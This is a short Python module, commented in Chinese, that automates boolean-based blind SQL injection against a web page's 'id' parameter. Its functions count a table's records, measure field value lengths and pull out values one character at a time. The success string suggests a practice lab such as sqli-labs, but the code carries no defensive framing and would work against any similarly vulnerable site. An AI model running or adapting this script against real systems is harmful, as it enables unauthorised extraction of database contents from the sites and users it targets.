'''
    表中记录的操作函数库
'''

import requests
from lxml import etree

def GetValueCount(main_url, TableName):
    # 一张表有多少条记录
    url = main_url+"?id=1' and if((select count(id) from {})={},1,0) --+"
    for i in range(20):
        test_url = url.format(TableName, i)
        req = requests.get(test_url)
        tag = etree.HTML(req.text).xpath("/html/body/div/font/font/text()")[0]
        if (tag == 'You are in...........'):
            return i


def GetValueLen(main_url, TableName, FieldName, t):
    # FieldName的第t条数据的长度
    url = main_url + "?id=1' and if((select length({}) from {} limit {}, 1)={},1,0) --+"
    for i in range(40):
        test_url = url.format(FieldName, TableName, t - 1, i)
        req = requests.get(test_url)
        tag = etree.HTML(req.text).xpath("/html/body/div/font/font/text()")[0]
        if (tag == 'You are in...........'):
            return i


def GetValue(main_url, TableName, FieldName, ValueLen, t):
    value = ""
    url = main_url + "?id=1' and if(ascii(substr((select {} from {} limit {},1),{},1))={},1,0) --+"
    for i in range(ValueLen + 1):
        for j in range(48, 122):
            test_url = url.format(FieldName, TableName, t - 1, i, j)
            req = requests.get(test_url)
            tag = etree.HTML(req.text).xpath("/html/body/div/font/font/text()")[0]
            if (tag == 'You are in...........'):
                # print("*第%d个字母是"%i+chr(j))
                value += chr(j)
    return value